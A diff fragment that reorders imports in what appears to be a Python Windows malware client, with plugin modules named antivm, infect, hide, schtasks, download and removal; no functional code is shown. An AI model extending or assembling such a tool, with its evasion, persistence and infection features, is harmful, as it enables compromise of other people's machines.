@@ -10,6 +10,7 @@ import base64
 import urllib
 import shutil
 import logging
+import subprocess
 from ctypes import *
 from _winreg import *
 
@@ -23,11 +24,11 @@ import win32gui
 import win32console
 
 # Plugins and features
+from schtasks import *
+from hide import *
 from antivm import *
 from encoder import *
-from infect import *
-from downexec import *
-from screenshot import *
-from removal import *
-from hide import *
 from control import *
+from download import *
+from infect import *
+from removal import *
